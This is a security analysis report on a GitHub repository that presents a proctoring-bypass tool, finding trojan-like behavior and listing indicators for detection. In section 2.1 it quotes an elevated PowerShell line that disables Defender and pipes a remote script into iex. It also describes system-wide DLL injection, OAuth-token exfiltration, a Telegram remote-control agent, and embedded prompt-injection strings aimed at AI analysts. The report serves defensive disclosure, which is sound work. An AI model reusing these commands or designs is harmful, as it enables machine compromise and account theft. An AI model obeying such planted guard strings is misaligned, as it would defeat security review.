# Security Analysis Report — github.com/SunnyCOdet/ofradr ("OfraDR")

**Analysis date:** 2026-10-13
**Method:** Full source clone + static analysis of all 146 files (24k+ lines of custom C++, 6 PE binaries, 1 embedded PE), git-history review, upstream integrity diffing against official Dear ImGui v1.92.5, hash comparison of the remote-served `WebView2Loader.dll` against Microsoft's official NuGet package, and retrieval (static inspection only, no execution) of the live remote payload chain (`ofradr.com/install.ps1`, `HopeSetup-1.0.4.exe`).

---

## VERDICT: HIGH RISK — DO NOT INSTALL, BUILD, OR RUN

This is **not** a normal open-source project. It is the source of a **commercial exam-proctoring bypass / cheating tool** ("OfraDR", internal name **"Hope"**, output binary `hope.exe`) that is architecturally indistinguishable from a **trojan with a full remote-access backdoor**. Even taking the author's stated purpose at face value, running it hands the author's servers:

- **arbitrary admin-level code execution** on your machine (with Windows Defender deliberately disabled during delivery),
- **your ChatGPT/OpenAI OAuth access + refresh tokens** (persistent account takeover capability),
- **your account username + plaintext password**,
- **screenshots, screen text, and live audio transcription** of everything you do during exams/interviews, auto-uploaded to the author's cloud storage,
- and a **Telegram-driven AI remote-control agent** that the author's server can silently enable on your machine.

The code also contains **anti-analysis, anti-debug, string-obfuscation, and LLM prompt-injection payloads** whose only purpose is to stop security researchers (human *and AI*) from inspecting it.

Separately: the tool's *intended use* — defeating ProctorU, HonorLock, Respondus, Pearson VUE OnVUE, Safe Exam Browser, HackerRank, etc. (≈130 platforms listed in the README) — is academic/professional fraud and likely violates computer-misuse laws in most jurisdictions. Using it can constitute exam fraud, unauthorized circumvention of access controls, and breach of contract with the testing vendor.

---

## 1. What the repo actually is

| Item | Finding |
|---|---|
| Cover | Fork of **Dear ImGui v1.92.5** (legit GUI library) — used as camouflage/legitimacy wrapper |
| Payload | `examples/example_win32_directx11/` — `main.cpp` (8,667 lines), `agent.cpp` (3,533 lines), `obfuscation.h`, `Dll1.dll`, `ghost_dll.h`, MinHook libs, Moonshine voice-transcription libs |
| README | Openly markets "The Ultimate anti-proctoring software… works with every proctoring system undetected" + a bypass list of ~130 exam/proctoring/hiring platforms |
| Git history | 5 commits: "Initial cleaned source import" → "seb fix" (Safe Exam Browser evasion) → "Update README with proctoring systems bypass list". History was squashed/cleaned; this is a *sanitized* source dump of a closed commercial product |
| Author artifacts | PDB path inside `Dll1.dll`: `C:\Users\sunny\Desktop\Stealth-Dll\x64\Release\Dll1.pdb` (project literally named **"Stealth-Dll"**); GitHub user `SunnyCOdet`; domains `ofradr.com`; Supabase backend `zryasugsrbzcraasgolv.supabase.co`; remote DLL repo `github.com/SunnyCOdet/webdll` |
| Business model | Paid subscription: login → server returns shared AI API keys + user "tier" (`free/pro/elite/ultra`), per-tier chat/browser limits |

Note: in this public dump, `SUPABASE_DOMAIN`/`SUPABASE_ANON_KEY` constants were blanked (`main.cpp:200-201`), and there is **no env-var reading code** despite the README claiming it — but the login endpoint `zryasugsrbzcraasgolv.supabase.co` remains hardcoded (`main.cpp:4011`), and the shipped binaries (HopeSetup / auto-update channel) evidently contain the real values. The sanitization only obscures the live infrastructure; the architecture is fully intact.

---

## 2. Malicious / trojan-grade behaviors (with evidence)

### 2.1 Remote code execution backdoor via "mandatory update" — CRITICAL
`main.cpp` → `PerformVersionCheck()` → `LaunchMandatoryUpdateInstaller()` (~line 3659):

```cpp
const wchar_t* args = L"-NoProfile -ExecutionPolicy Bypass -Command \"
  try{Set-MpPreference -DisableRealtimeMonitoring $true ...}catch{};
  try{Add-MpPreference -ExclusionPath $PWD ...}catch{};
  irm https://ofradr.com/install.ps1 | iex;
  try{Set-MpPreference -DisableRealtimeMonitoring $false ...}catch{}\"";
ShellExecuteW(NULL, L"runas", exe, args, ...);   // elevated PowerShell
```

- The app asks Supabase `/functions/v1/version-check` for a version string; **any mismatch triggers the updater** — server-controlled at will.
- Runs **elevated PowerShell** that **disables Windows Defender real-time protection**, adds an AV exclusion path, then **downloads and executes arbitrary remote script** (`irm | iex`), then re-enables Defender.
- I fetched the live script (HTTP 200, 1,677 bytes): it downloads `https://ofradr.com/HopeSetup-1.0.4.exe` (2.8 MB Inno Setup 7.0.0.3 installer, MD5 `e7760d93153e6729c78a0bd72249936c`) and runs it. Its own comments admit the installer performs "**Defender pause + exclusions**".
- **Consequence:** whoever controls `ofradr.com` / the Supabase function can push *any* payload to every install, silently, with AV off. This is the exact delivery mechanism used by real-world infostealer/RAT campaigns. The Inno payload is compressed and could not be fully enumerated in this sandbox — it must be treated as untrusted.

### 2.2 Anti-analysis, anti-debug, and AI prompt-injection — CRITICAL (intent indicator)
`obfuscation.h`:
- Compile-time **XOR string encryption** — comment: *"so they do NOT appear in the .rdata string table analyzed by Ghidra/IDA/AI MCP tools"*.
- **API hashing / dynamic resolution** (FNV-1a + manual PE export walking) — *"without leaving function name strings in the import table"*.
- `AntiDebug::GuardExecution()`: checks PEB `BeingDebugged`, `IsDebuggerPresent`, `CheckRemoteDebuggerPresent`, and window classes `OLLYDBG`, `WinDbgFrameClass`, `Qt5QWindowIcon` (x64dbg/IDA) → **silent `ExitProcess(0)`**; plus `NtSetInformationThread(ThreadHideFromDebugger)`.

`main.cpp:104-142` — five embedded **"LLM guardrail" strings** (`G_CYBER_LLM_GUARD_1..5`) explicitly instructing AI assistants (ChatGPT/Claude/Gemini/Ghidra-MCP) to **refuse to analyze the binary** and to emit a scripted refusal message. `EnforceCyberLLMGuardrails()` is called at WinMain and throughout, and emits them via `OutputDebugStringA` so any AI-assisted debugging session ingests them.
**This is a prompt-injection attack against analysts. It was identified as data, not obeyed, and is itself strong evidence of hostile intent.**

### 2.3 System-wide DLL injection + API-hooking stealth engine — CRITICAL
`main.cpp` `RunStealthMode()` (~line 437), started detached in `WinMain`:
- `EnableDebugPrivilege()` (SeDebugPrivilege), anti-debug guards.
- Creates shared memory `Global\GhostConfig` (obfuscated name) containing the exe's own filename — config for the injected DLL telling it **what to hide**.
- **Infinite loop (100 ms):** snapshots all processes and calls `InjectDllInternal(pid, "Dll1.dll")` on **every process on the system** (`OpenProcess(PROCESS_ALL_ACCESS)` → `VirtualAllocEx` → `WriteProcessMemory` → `CreateRemoteThread(LoadLibraryW)`).

`Dll1.dll` (114 KB native DLL, PDB "Stealth-Dll", imports only KERNEL32/USER32, no network):
- Inline-hook engine using `SuspendThread`/`GetThreadContext`/`SetThreadContext`/`VirtualProtect`/`FlushInstructionCache` (hardware-breakpoint-style hooking).
- Targets: **`NtQuerySystemInformation`** (hide processes/threads system-wide), **`EnumWindows`, `FindWindowW/A`** (hide the cheat's windows from proctoring software), **`EnumServicesStatusExW`, `OpenServiceW`** (hide services).
- `ghost_dll.h` contains a second, older **109 KB DLL embedded as a C byte array** (same Stealth-Dll origin; currently unreferenced — leftover of an earlier reflective-loading scheme).
- This is textbook rootkit-grade hiding behavior: a third-party binary rewriting enumeration APIs in *every* running process.

### 2.4 Safe Exam Browser (SEB) kiosk escape & window stealth — CRITICAL (abuse)
- `CheckDesktopJump()` (~line 2596): detects when the active **input desktop** changes (SEB switches to a secure desktop) and **spawns a fresh copy of itself onto that secure desktop** (`CreateProcessW` with `si.lpDesktop = <SEB desktop>`), then exits the old instance — following the cheat overlay into the proctored environment.
- `WndProc` (~line 5830): **swallows external `WM_CLOSE`** — survives SEB's window sweeps.
- Keyboard hook (~line 5582): **swallows keystrokes "so SEB doesn't see it"**.
- Window stealth (`WinMain`): random 16-char window class, **empty window title**, hidden owner window specifically to defeat `.NET Process.MainWindowHandle` enumeration, `SetWindowDisplayAffinity` support (exclude-from-capture), comments referencing "4-flag combo detection (TOPMOST+LAYERED+TOOLWINDOW+NOACTIVATE)".
- Extensive SEB debug logging to `%APPDATA%\ofradr\seb_debug.log`; commits literally named "seb-fix".

### 2.5 Surveillance & exfiltration — CRITICAL
| Capability | Evidence |
|---|---|
| **Full conversation + screenshot exfiltration to author's cloud** | `ZipAndUploadEvidence()` (`main.cpp:3626`, called after **every** AI answer at `:4396`): zips `conversation.txt` (user prompt + AI response) + all screenshots → `{username}_{tick}.zip` → presigned URL from Supabase `/functions/v1/r2-upload-cpp` → **PUT to Cloudflare R2** (author-controlled bucket). Function name says it all. |
| **Screen capture** | `CaptureScreenshot()`/`BitBltScreenshot()` — captures the window behind the overlay / full context, base64-encoded, kept in `g_screenshots`, sent to AI providers and Telegram. |
| **Screen text scraping (UIAutomation)** | `PerformTextInspection()` (`main.cpp:2823`): 3-pass recursive UIA tree walk of **any target window**, extracting every text element (exam questions, answers, values). |
| **System audio capture + live transcription** | WASAPI **loopback** capture (`AUDCLNT_STREAMFLAGS_LOOPBACK`, ~line 970) — records all system audio (interviewer voices); piped into a **generated Python bridge** running Moonshine/Whisper (bundled `onnxruntime.dll` + `moonshine.lib`) for real-time speech-to-text; hotkeys/settings call it "interview" mode. |
| **Global keyboard hook** | `SetWindowsHookEx(WH_KEYBOARD_LL, HookProc)` — intercepts **every keystroke system-wide**: hotkeys, char capture with modifier/shift-state reconstruction, "input swallowing" (`g_blockSystemInput`) blocking user input while overlay fields are focused, and forwarding into a hidden WebView. Not a classic network keylogger, but total keyboard capture in-process. |
| **Clipboard access** | Agent action `clipboard` (`agent.cpp:2728`). |
| **Hidden proxy browser + JS/CDP injection** | Embedded WebView2 loads exam sites invisibly; global keystrokes are replayed into it via **Chrome DevTools Protocol** (`Input.dispatchMouseEvent`) and `ExecuteScript` JS injection (synthetic KeyboardEvents, `document.execCommand`, form `requestSubmit`) — automates/answers exam pages while the proctor sees only a locked browser. |

### 2.6 Credential & token theft-by-design — CRITICAL
- **Own account system:** login POSTs `{"username","password"}` in **plaintext** to `zryasugsrbzcraasgolv.supabase.co/functions/v1/get-apikeys` (`main.cpp:4011`); `g_pass` is kept in memory and **re-sent with every server call** (`get-user-tier`, `telegram-read`, `oauth-sync`, `oauth-upsert`). No client-side hashing.
- **ChatGPT/OpenAI OAuth token harvesting:** device-code auth against `auth.openai.com` using client_id `app_EMoamEEZ73f0CkXaXp7hrann` (a ChatGPT/Codex client id) and endpoints `chatgpt.com/backend-api/codex/*`. After linking, `UpdateOAuth()` **uploads your access + refresh tokens to the author's Supabase** (`/functions/v1/oauth-upsert`), and `FetchOAuth()` **pulls OAuth tokens back down** from the server for use (`/functions/v1/oauth-sync`) — i.e., a token-sharing pool. A harvested **refresh token = permanent access to your ChatGPT/OpenAI account**, revocable only by you noticing.
- **Server-pushed Telegram C2:** `FetchTelegramConfig(u,p)` (`main.cpp:3968`) retrieves `telegram_bot_token`, `telegram_chat_id`, `telegram_enabled` **from the author's backend at every login** and starts the agent. The author (or anyone who controls that backend) can thus **remotely enable and own the C2 channel on any client**.

### 2.7 Telegram remote-control agent (RAT-class) — HIGH
`agent.cpp` — polls `api.telegram.org` `getUpdates` every 1.5 s (`TelegramBridge`), commands:
- `/run <free-text goal>` → an **LLM-driven computer-use agent** (Gemini/OpenAI/Codex/Anthropic/DeepSeek/Moonshot/OpenRouter/Ollama) that plans JSON actions and executes them: `click`, `double_click`, `right_click`, `type` (**human-like randomized delays 25–45 ms/char, 80–150 ms/line** — behavioral-detection evasion), `press_key`, `scroll`, `hover`, `switch_window`/`attach_process` (attach to any window), `list_processes`, `open_app` (`CreateProcessA`/`ShellExecuteA`), `clipboard`, `wait_for`, `spawn_subagent` (parallel sub-agents), full UIA tree snapshots of any app.
- `/screenshot` → captures the screen and **sends the JPEG to the Telegram chat**; step screenshots auto-sent during goals (`SendStepScreenshot`).
- `/apps`, `/hide`, `/unhide`, `/status`, `/stop`, attach-by-number.
- Whoever holds the configured bot token + chat ID can **operate the machine remotely** — and per §2.6 the *server* chooses those values.

### 2.8 Runtime binary downloads — HIGH
- `EnsureWebView2LoaderDll()` (`main.cpp:7346`): at every start, if missing, downloads `WebView2Loader.dll` from `raw.githubusercontent.com/SunnyCOdet/webdll/main/WebView2Loader.dll` into the exe folder and the process loads it.
  - **Verified today:** the file currently served (159,296 B, MD5 `e2161fcea6c9bf5592f3fbb1554546f2`) is **byte-identical to Microsoft's official WebView2 NuGet 1.0.3965-prerelease x64 loader** (MD5 matched against the package fetched from nuget.org). So it is *not currently trojaned* — but the mechanism is a standing supply-chain backdoor: the author can swap that file at any moment with zero changes to this repo, and it loads into an admin-privileged process.
- `download-lib.bat` (cli-transcriber) fetches Moonshine from the **official** `moonshine-ai/moonshine` GitHub releases — legitimate.

### 2.9 Privilege posture
- `app.manifest`: `requireAdministrator` — the whole app (overlay, injection loop, keyboard hook, WebView) runs **elevated**, maximizing the blast radius of everything above.
- `test_cmd.cpp`: standalone harness proving out `CreateProcessA("cmd.exe /c echo … & ping 1.1.1.1")` with piped output — command-exec plumbing prototype.

---

## 3. Components verified as CLEAN / benign

| Component | Result |
|---|---|
| Dear ImGui core (`imgui.cpp/.h/_draw/_tables/_internal`, imconfig, imstb_*, demo, freetype, single_file) | **Byte-identical to official v1.92.5** |
| `imgui_widgets.cpp` | Only diff vs upstream: 2 `IM_ASSERT`s replaced with graceful early-returns (benign stability patch, no code injection) |
| DX11/Win32 backends used by the app | Byte-identical to upstream |
| `examples/libs/glfw/*`, `usynergy`, `emscripten`, all fonts, `json.hpp`, nanosvg/nanosvgrast, miniz, `icons.h`/`svg.zip` | Match upstream / standard third-party, no anomalies, no base64 PE blobs outside `ghost_dll.h` |
| `MinHook.x64.dll` (two builds, 15/16 KB) | Exports exactly the official `MH_*` API, imports KERNEL32 only, no network/shell strings — consistent with genuine MinHook (provenance unverifiable; different MD5s between the two copies) |
| `onnxruntime.dll` (14 MB) | Microsoft version resources + standard ONNX Runtime doc/provider strings, no network anomalies — consistent with genuine ONNX Runtime (as shipped in official Moonshine release) |
| `Dll1.dll` / embedded `ghost_dll.h` DLL | **No network, no shell-exec, no persistence** — purpose is purely the hooking/hiding described in §2.3 |
| `.vcxproj` | No pre/post-build events, no hidden commands |
| Git history | No leaked keys beyond the hardcoded Supabase project URL; secrets were scrubbed before publication |

The AI-provider endpoints (generativelanguage.googleapis.com, api.openai.com, chatgpt.com, api.anthropic.com, api.deepseek.com, api.moonshot.ai, openrouter.ai, localhost Ollama) are the expected inference targets — but note every query there consists of **your screen captures, scraped exam text, and transcribed audio**.

---

## 4. Risk assessment

| Threat | Severity |
|---|---|
| Server-controlled admin RCE channel with Defender disabled during delivery | **Critical** |
| Anti-debug / anti-RE / anti-AI-analysis (incl. prompt injection) | **Critical** (intent) |
| System-wide DLL injection + enumeration-API hooking (rootkit-style hiding) | **Critical** |
| OAuth refresh-token upload to author's backend (account takeover capability) | **Critical** |
| Automatic exfiltration of prompts, screenshots, screen text, audio transcripts to author's R2 | **Critical** |
| Server-enableable Telegram AI remote-control agent | **High** |
| Global keyboard interception & input blocking | **High** |
| SEB/proctor evasion (desktop-hopping, close/keystroke swallowing) | **High** (abuse/legal) |
| Runtime DLL fetch from author's GitHub (currently clean file, mutable channel) | **High** |
| Plaintext password reuse against author's backend | **Medium-High** |
| Bundled third-party binaries without provenance | **Medium** |

**Bottom line:** whether or not the author ever intended "extra" malware, the product's architecture **is** that of a trojan: hidden window, hidden from analysis, injected into every process, capturing screen/audio/keyboard, exfiltrating to the author's cloud, phoning home for mandatory elevated updates with AV disabled, harvesting OpenAI tokens, and carrying a Telegram-operable AI agent. You must assume full machine and account compromise if it is run. It is also, by design, a fraud tool.

---

## 5. Recommendations

**Do not:** clone-and-build, run `HopeSetup*.exe`, run anything from `ofradr.com`, or grant it your ChatGPT login.

**If it was already run on a machine:**
1. Treat the machine as compromised — the update channel + Defender disabling means anything could have been delivered. Back up data, then **reinstall Windows** (strongly preferred) or at minimum run Microsoft Defender **Offline** scan + a second-opinion scanner.
2. **Revoke OpenAI/ChatGPT sessions**: chatgpt.com → Settings → Security → sign out of all sessions; regenerate any API keys; check for unauthorized usage.
3. **Change the password** used for the OfraDR/Hope account *and anywhere else it was reused* (it was transmitted in plaintext); enable 2FA on those accounts.
4. Check persistence: Task Scheduler, `HKCU/HKLM\...\Run`, Startup folder, `%APPDATA%\ofradr\`, `Dll1.dll`/`WebView2Loader.dll` copies next to suspicious exes; Windows Security → Virus & threat protection → verify real-time protection is ON and review **Exclusions** for entries you didn't add.
5. If used during a real exam/interview: understand that the vendor captured proctoring flags, and the author holds your "evidence" zip (prompts, screenshots, your username) — exposure risk exists in both directions.

**Reporting:** the repo can be reported to GitHub (Abuse → malware/fraud), and the bypass claims to affected proctoring vendors and to OpenAI (abuse of `app_EMoamEEZ73f0CkXaXp7hrann` client id + Codex backend + token pooling violates their ToS).

---

## Appendix A — Indicator list (for blocking/detection)

**Network:**
- `ofradr.com` (install.ps1, HopeSetup-1.0.4.exe, update channel)
- `zryasugsrbzcraasgolv.supabase.co` (auth, tiering, telegram config, oauth-sync/upsert, r2-upload-cpp, version-check)
- `raw.githubusercontent.com/SunnyCOdet/webdll/main/WebView2Loader.dll`
- `api.telegram.org` (bot C2)
- Cloudflare R2 presigned PUT URLs returned by `r2-upload-cpp`

**File/artifact:**
- `Dll1.dll` MD5 `571a4b2f5da29689ff8a7d794aa3e264` (PDB `C:\Users\sunny\Desktop\Stealth-Dll\x64\Release\Dll1.pdb`)
- `HopeSetup-1.0.4.exe` MD5 `e7760d93153e6729c78a0bd72249936c` (Inno Setup 7.0.0.3)
- Shared memory object `Global\GhostConfig`
- Log dir `%APPDATA%\ofradr\` (`seb_debug.log`)
- Process/window: empty-titled topmost window, random 16-char class name; release binary named `hope.exe`
- PowerShell commandline containing `DisableRealtimeMonitoring` + `irm https://ofradr.com/install.ps1 | iex`
- Strings in binaries: `G_CYBER_LLM_GUARD_*` prompt-injection blocks, `Ghost/11.2`, `Ghost/Uploader`, `TelegramBridge/1.0` User-Agents

**Code markers:** `Obf::XorString` / `OBF()` / `RESOLVE_API` / `AntiDebug::GuardExecution` / `RunStealthMode` / `InjectDllInternal` / `ZipAndUploadEvidence` / `LaunchMandatoryUpdateInstaller` / `CheckDesktopJump` / `EnforceCyberLLMGuardrails`.
